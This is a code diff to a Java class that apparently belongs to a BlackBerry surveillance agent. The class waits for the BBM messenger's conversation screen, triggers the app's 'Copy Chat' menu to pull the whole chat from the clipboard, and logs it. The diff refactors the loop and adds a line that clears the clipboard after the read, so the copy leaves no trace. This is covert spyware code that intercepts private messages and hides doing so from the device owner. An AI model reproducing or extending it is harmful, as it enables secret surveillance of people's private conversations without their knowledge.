@@ -30,9 +30,15 @@ public class ConversationScreen implements Runnable {
             Utils.sleep(2000);
             debug.trace("run");
 
+            getConversationScreen();
+        }
+    }
+
+    public void getConversationScreen() {
+        try {
             if (bbmApplication == null || !Backlight.isEnabled()) {
                 debug.ledStart(Debug.COLOR_RED);
-                continue;
+                return;
             }
 
             Screen screen = bbmApplication.getActiveScreen();
@@ -60,7 +66,14 @@ public class ConversationScreen implements Runnable {
                     //Vector textfields = explorer.explore(screen, true);
                 }
             }
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            debug.error("getConversationScreen: " + ex);
+            ex.printStackTrace();
+            //#endif
+
         }
+        return;
     }
 
     private String extractConversation(Screen screen) {
@@ -70,6 +83,7 @@ public class ConversationScreen implements Runnable {
         // debug.trace("try copy chat: "+screen);
         if (MenuWalker.walk("Copy Chat", screen, true)) {
             String clip = (String) Clipboard.getClipboard().get();
+            Clipboard.getClipboard().put("");
             debug.info("Clip: "
                     + clip.substring(0, Math.min(100, clip.length())));
             return clip;
